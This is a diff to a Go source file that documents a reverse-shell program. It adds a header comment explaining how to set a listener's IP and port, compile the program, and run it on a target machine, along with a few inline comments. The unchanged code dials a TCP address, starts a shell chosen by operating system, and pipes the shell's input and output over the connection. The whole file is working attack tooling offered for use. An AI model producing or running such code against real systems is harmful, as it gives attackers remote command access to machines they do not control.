@@ -1,3 +1,10 @@
+/*
+This is a Go program which will create a reverse shell by connecting to a specified address and port.
+
+Usage: Edit line 16 in shell.go to use the IP address and port of your listener.
+Compile and then execute the program from the target machine to have it establish a session with you.
+*/
+
 package main
 
 import (
@@ -9,8 +16,10 @@ import (
 )
 
 func main() {
+	// Create a new connection to the specified address.
 	if client, err := net.Dial("tcp", "localhost:6969"); err == nil {
 		var cmd *exec.Cmd
+		// Switch which shell to use depending on the OS.
 		switch runtime.GOOS {
 		case "linux":
 			os.Setenv("TERM", "xterm-256color")
@@ -22,6 +31,7 @@ func main() {
 		cmd.Stdin = client
 		cmd.Stdout = client
 		cmd.Stderr = client
+		// Runs the command.
 		cmd.Run()
 		client.Close()
 	}
